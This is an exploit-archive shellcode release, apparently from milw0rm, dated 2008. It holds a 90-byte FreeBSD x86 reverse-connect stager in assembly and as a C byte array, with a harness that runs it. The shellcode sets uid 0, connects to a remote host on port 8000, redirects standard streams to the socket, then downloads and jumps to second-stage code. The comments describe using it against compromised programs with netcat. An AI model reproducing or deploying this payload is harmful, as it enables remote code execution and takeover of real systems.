/*
; sm4x - 2008
; reverse connect dl(shellcode) and execute, exit
;  - i've used this to feed pwnd progs huge messy shellcode ret'ing the results over nc ;)
;  - feed it with a $nc -vvl -p8000 <shellcode_in_file
; setuid(0); socket(); connect(); dups(); recv(); jmp; exit();
; 90 bytes (NULL free dep on remote address)
; FreeBSD 7.0-RELEASE

global _start
_start:

xor     eax, eax

; --- setuid(0)
push    eax
push    eax
mov     al, 0x17
push    eax
int     0x80

; --- socket()
push    eax
push    byte 0x01
push    byte 0x02
mov     al, 0x61
push    eax
int     0x80
mov     edx, eax

; --- sockaddr_in setup
push    0x90011ac      ; host 172.17.0.9 (.0. is a NULL)
push    0x401f02AA     ; port 8000
mov     eax, esp

; --- setup connect(edx, eax, 0x10);
push    byte 0x10
push    eax
push    edx
xor     eax, eax
mov     al, 0x62
push    eax
int     0x80
jne     done

; --- dup2(0+1+2) - remove if you dont want results sent over the wire
mov     cl, 0x03
xor     ebx, ebx
dups:
push    ebx
push    edx
mov     al, 0x5a
push    eax
int     0x80
inc     ebx
loop    dups

; --- recv(fd, *buf, 1028);
xor     eax, eax
push    word 0x0404      ; conf read size here
lea     ecx, [esp-0x0404] ; and here
push    ecx
push    edx
mov     al, 0x03
push    eax
int     0x80

; --- jmp to recv shellcode
jmp     ecx          ; run shellcode
done:

; --- exit (optional -> pls exit from jmp shellcode)
xor     eax, eax
inc     eax
push    eax
push    eax
int     0x80

*/

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>

char code[] = "\x31\xc0\x50\x50\xb0\x17\x50\xcd\x80\x50"
       "\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89"
       "\xc2\x68\xac\x11\x00\x09\x68\xaa\x02\x1f"
       "\x40\x89\xe0\x6a\x10\x50\x52\x31\xc0\xb0"
       "\x62\x50\xcd\x80\x75\x24\xb1\x03\x31\xdb"
       "\x53\x52\xb0\x5a\x50\xcd\x80\x43\xe2\xf6"
       "\x31\xc0\x66\x68\x04\x04\x8d\x8c\x24\xfc"
       "\xfb\xff\xff\x51\x52\xb0\x03\x50\xcd\x80"
       "\xff\xe1\x31\xc0\x40\x50\x50\xcd\x80";

int main(int argc, char **argv) {
 int (*func)();
 printf("Bytes: %d\n", sizeof(code));
 func = (int (*)()) code;
 (int)(*func)();
}

// milw0rm.com [2008-09-05]